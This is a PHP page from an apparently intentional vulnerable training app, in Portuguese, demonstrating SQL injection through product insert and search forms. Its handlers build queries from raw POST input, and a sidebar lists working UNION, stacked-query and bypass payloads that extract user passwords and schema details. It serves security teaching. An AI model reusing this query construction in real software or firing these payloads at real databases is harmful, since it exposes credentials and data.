<?php
defined('APP') or die('Access denied');
include("db.php");
?>

<div class="container mt-4">
    <h3>📦 SQL Injection - Product Management</h3>

    <div class="alert alert-danger" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página contém vulnerabilidades SQL no gerenciamento de produtos para fins educacionais!
    </div>

    <div class="row">
        <div class="col-md-8">
            <!-- Product Insertion Form -->
            <div class="card mb-4">
                <div class="card-header">
                    <h5>➕ Adicionar Novo Produto</h5>
                </div>
                <div class="card-body">
                    <form action="?page=sql-injection-product" method="post">
                        <input type="hidden" name="action" value="insert">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="name" class="form-label">Nome do Produto</label>
                                    <input type="text" name="name" id="name" class="form-control" placeholder="Digite o nome..." value="<?php echo isset($_POST['name']) ? htmlspecialchars($_POST['name']) : ''; ?>" required>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="price" class="form-label">Preço (R$)</label>
                                    <input type="text" name="price" id="price" class="form-control" placeholder="0.00" value="<?php echo isset($_POST['price']) ? htmlspecialchars($_POST['price']) : ''; ?>" required>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="category" class="form-label">Categoria</label>
                                    <input type="text" name="category" id="category" class="form-control" placeholder="Electronics, Storage, etc." value="<?php echo isset($_POST['category']) ? htmlspecialchars($_POST['category']) : ''; ?>">
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="stock" class="form-label">Estoque</label>
                                    <input type="text" name="stock" id="stock" class="form-control" placeholder="0" value="<?php echo isset($_POST['stock']) ? htmlspecialchars($_POST['stock']) : ''; ?>">
                                </div>
                            </div>
                        </div>
                        <div class="mb-3">
                            <label for="description" class="form-label">Descrição</label>
                            <textarea name="description" id="description" class="form-control" rows="3" placeholder="Descrição do produto..."><?php echo isset($_POST['description']) ? htmlspecialchars($_POST['description']) : ''; ?></textarea>
                        </div>
                        <button type="submit" class="btn btn-primary">➕ Adicionar Produto</button>
                    </form>
                </div>
            </div>

            <!-- Product Search Form -->
            <div class="card">
                <div class="card-header">
                    <h5>🔍 Buscar Produtos</h5>
                </div>
                <div class="card-body">
                    <form action="?page=sql-injection-product" method="post">
                        <input type="hidden" name="action" value="search">
                        <div class="row">
                            <div class="col-md-8">
                                <div class="mb-3">
                                    <label for="search_term" class="form-label">Termo de Busca</label>
                                    <input type="text" name="search_term" id="search_term" class="form-control" placeholder="Nome do produto ou payload SQLi..." value="<?php echo isset($_POST['search_term']) ? htmlspecialchars($_POST['search_term']) : ''; ?>">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="mb-3">
                                    <label for="limit_results" class="form-label">Limite de Resultados</label>
                                    <input type="text" name="limit_results" id="limit_results" class="form-control" placeholder="10" value="<?php echo isset($_POST['limit_results']) ? htmlspecialchars($_POST['limit_results']) : '10'; ?>">
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-success">🔍 Buscar</button>
                    </form>

                    <div class="mt-3">
                        <h6>Exemplos Rápidos:</h6>
                        <div class="d-grid gap-2 d-md-block">
                            <button class="btn btn-outline-info btn-sm" onclick="setSearchTerm('USB')">📱 Buscar USB</button>
                            <button class="btn btn-outline-warning btn-sm" onclick="setSearchTerm('HD%')">💾 Buscar HD</button>
                            <button class="btn btn-outline-success btn-sm" onclick="setSearchTerm('%')">📦 Todos Produtos</button>
                            <button class="btn btn-outline-danger btn-sm" onclick="setSearchTerm('test\' OR 1=1 # ')">🚨 SQLi Bypass</button>
                        </div>
                    </div>
                </div>
            </div>

            <?php
            // Handle form submissions
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $action = $_POST['action'] ?? '';

                if ($action === 'insert') {
                    // Product insertion (vulnerable to SQL injection)
                    $name = $_POST['name'];
                    $description = $_POST['description'];
                    $price = $_POST['price'];
                    $category = $_POST['category'] ?: 'Electronics';
                    $stock = $_POST['stock'] ?: '0';

                    $query = "INSERT INTO product (name, description, price, category, stock) VALUES ('$name', '$description', '$price', '$category', '$stock')";

                    echo "<div class='card mt-4'>";
                    echo "<div class='card-header'>";
                    echo "<h6>📊 Resultado da Inserção</h6>";
                    echo "<small class='text-muted'>Query executada: <code>" . htmlspecialchars($query) . "</code></small>";
                    echo "</div>";
                    echo "<div class='card-body'>";

                    $result = $mysqli->query($query);

                    if ($result) {
                        $inserted_id = $mysqli->insert_id;
                        echo "<div class='alert alert-success' role='alert'>";
                        echo "<strong>✅ Produto inserido com sucesso!</strong><br>";
                        echo "ID do produto: <strong>$inserted_id</strong>";
                        echo "</div>";

                        // Show inserted product
                        $show_query = "SELECT * FROM product WHERE id = $inserted_id";
                        $show_result = $mysqli->query($show_query);
                        if ($show_result && $show_result->num_rows > 0) {
                            echo "<h6>Produto Inserido:</h6>";
                            echo "<div class='table-responsive'>";
                            echo "<table class='table table-striped table-sm'>";
                            echo "<thead class='table-dark'>";
                            echo "<tr><th>ID</th><th>Nome</th><th>Descrição</th><th>Preço</th><th>Categoria</th><th>Estoque</th></tr>";
                            echo "</thead><tbody>";
                            $row = $show_result->fetch_assoc();
                            echo "<tr>";
                            echo "<td>" . htmlspecialchars($row['id']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['name']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['description']) . "</td>";
                            echo "<td>R$ " . htmlspecialchars($row['price']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['category']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['stock']) . "</td>";
                            echo "</tr>";
                            echo "</tbody></table>";
                            echo "</div>";
                        }
                    } else {
                        echo "<div class='alert alert-danger' role='alert'>";
                        echo "<strong>💥 Erro na inserção:</strong><br>";
                        echo "<code>" . htmlspecialchars($mysqli->error) . "</code>";
                        echo "</div>";
                    }

                    echo "</div>";
                    echo "</div>";

                } elseif ($action === 'search') {
                    // Product search (vulnerable to SQL injection)
                    $search_term = $_POST['search_term'];
                    $limit = $_POST['limit_results'] ?: '10';

                    $query = "SELECT * FROM product WHERE name LIKE '%$search_term%' LIMIT $limit";

                    echo "<div class='card mt-4'>";
                    echo "<div class='card-header'>";
                    echo "<h6>📊 Resultado da Busca</h6>";
                    echo "<small class='text-muted'>Query executada: <code>" . htmlspecialchars($query) . "</code></small>";
                    echo "</div>";
                    echo "<div class='card-body'>";

                    $result = $mysqli->query($query);

                    if ($result) {
                        if ($result->num_rows > 0) {
                            echo "<div class='alert alert-success' role='alert'>";
                            echo "<strong>✅ Busca realizada com sucesso!</strong><br>";
                            echo "Encontrados <strong>" . $result->num_rows . "</strong> resultado(s).";
                            echo "</div>";

                            echo "<div class='table-responsive'>";
                            echo "<table class='table table-striped table-sm'>";
                            echo "<thead class='table-dark'>";
                            echo "<tr>";

                            // Get column names dynamically
                            $fields = $result->fetch_fields();
                            foreach ($fields as $field) {
                                echo "<th>" . htmlspecialchars($field->name) . "</th>";
                            }
                            echo "</tr>";
                            echo "</thead>";
                            echo "<tbody>";

                            // Display data
                            while ($row = $result->fetch_assoc()) {
                                echo "<tr>";
                                foreach ($row as $value) {
                                    echo "<td>" . htmlspecialchars($value) . "</td>";
                                }
                                echo "</tr>";
                            }
                            echo "</tbody>";
                            echo "</table>";
                            echo "</div>";
                        } else {
                            echo "<div class='alert alert-warning' role='alert'>";
                            echo "<strong>❌ Nenhum produto encontrado</strong><br>";
                            echo "Tente outro termo de busca ou use wildcards (%).";
                            echo "</div>";
                        }
                    } else {
                        echo "<div class='alert alert-danger' role='alert'>";
                        echo "<strong>💥 Erro na consulta SQL:</strong><br>";
                        echo "<code>" . htmlspecialchars($mysqli->error) . "</code>";
                        echo "</div>";
                    }

                    echo "</div>";
                    echo "</div>";
                }
            }
            ?>
        </div>

        <div class="col-md-4">
            <div class="card">
                <div class="card-header">
                    <h6>💡 SQL Injection Examples</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="productExamples">
                        <!-- Insertion Attacks -->
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingInsert">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseInsert">
                                    Ataques via Inserção
                                </button>
                            </h2>
                            <div id="collapseInsert" class="accordion-collapse collapse show" data-bs-parent="#productExamples">
                                <div class="accordion-body">
                                    <strong>Inserção maliciosa no nome:</strong><br>
                                    Nome: <code>Produto', 'desc', 99.99, 'cat', 10); INSERT INTO product VALUES (NULL, 'Malware', 'Backdoor', 0, 'Hack', 1, NOW()); # </code><br><br>

                                    <strong>Extração de dados via nome:</strong><br>
                                    Nome: <code>Test', (SELECT password FROM user WHERE username='admin'), 0, 'hack', 0); # </code><br><br>

                                    <strong>Quebrar INSERT para fazer SELECT:</strong><br>
                                    Nome: <code>'; SELECT username, password FROM user; # </code>
                                </div>
                            </div>
                        </div>

                        <!-- Search Attacks -->
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingSearch">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseSearch">
                                    Ataques via Busca
                                </button>
                            </h2>
                            <div id="collapseSearch" class="accordion-collapse collapse" data-bs-parent="#productExamples">
                                <div class="accordion-body">
                                    <strong>UNION para extrair usuários:</strong><br>
                                    Busca: <code>' UNION SELECT id,username,password,email,NULL,NULL,NULL FROM user # </code><br><br>

                                    <strong>Extrair apenas senha do admin:</strong><br>
                                    Busca: <code>' UNION SELECT 1,'Admin Password',password,'extracted',NULL,NULL,NULL FROM user WHERE username='admin' # </code><br><br>

                                    <strong>Descobrir estrutura de tabelas:</strong><br>
                                    Busca: <code>' UNION SELECT 1,table_name,column_name,'info',NULL,NULL,NULL FROM information_schema.columns WHERE table_schema=database() # </code>
                                </div>
                            </div>
                        </div>

                        <!-- Data Extraction -->
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingExtract">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseExtract">
                                    Extração de Dados
                                </button>
                            </h2>
                            <div id="collapseExtract" class="accordion-collapse collapse" data-bs-parent="#productExamples">
                                <div class="accordion-body">
                                    <strong>Listar todas as tabelas:</strong><br>
                                    Busca: <code>' UNION SELECT 1,table_name,'Table','List',NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() # </code><br><br>

                                    <strong>Contar registros de usuários:</strong><br>
                                    Busca: <code>' UNION SELECT 1,'Total Users',COUNT(*),'Count',NULL,NULL,NULL FROM user # </code><br><br>

                                    <strong>Extrair dados concatenados:</strong><br>
                                    Busca: <code>' UNION SELECT 1,CONCAT(username,':',password),'Credentials','Data',NULL,NULL,NULL FROM user # </code>
                                </div>
                            </div>
                        </div>

                        <!-- Bypass Techniques -->
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingBypass">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseBypass">
                                    Técnicas de Bypass
                                </button>
                            </h2>
                            <div id="collapseBypass" class="accordion-collapse collapse" data-bs-parent="#productExamples">
                                <div class="accordion-body">
                                    <strong>Bypass com comentários:</strong><br>
                                    Busca: <code>test' OR 1=1 # </code><br><br>

                                    <strong>Bypass com UNION NULL:</strong><br>
                                    Busca: <code>' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL # </code><br><br>

                                    <strong>Determinar número de colunas:</strong><br>
                                    Busca: <code>' ORDER BY 7 # </code><br>
                                    <small class="text-muted">Se erro, tente números menores</small>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="mt-3">
                        <h6>💡 Dicas Importantes:</h6>
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item">• Tabela product tem 7 colunas</li>
                            <li class="list-group-item">• Use # para comentar resto da query</li>
                            <li class="list-group-item">• UNION precisa do mesmo número de colunas</li>
                            <li class="list-group-item">• Teste ORDER BY para contar colunas</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function setSearchTerm(value) {
    document.getElementById('search_term').value = value;
}
</script>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mysqli->close();
}
?>